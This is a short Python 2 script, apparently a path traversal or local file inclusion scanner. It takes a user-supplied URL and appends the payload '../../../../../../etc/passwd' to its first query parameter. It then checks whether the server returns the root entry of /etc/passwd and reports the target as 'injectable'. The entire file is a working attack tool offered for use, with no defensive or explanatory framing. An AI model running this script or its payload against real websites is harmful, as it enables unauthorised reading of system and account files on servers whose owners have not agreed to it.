#!/usr/bin/env python
import requests


url=raw_input("URL  ")
url=url.split("=")[0]
payload = "=../../../../../../etc/passwd"
url= url + payload
request= requests.get(url)
index = request.content.find("root:x:0:0:root:/root:/bin/bash")
if index != -1:
	print "[+]"
else:
	print "not injectable"
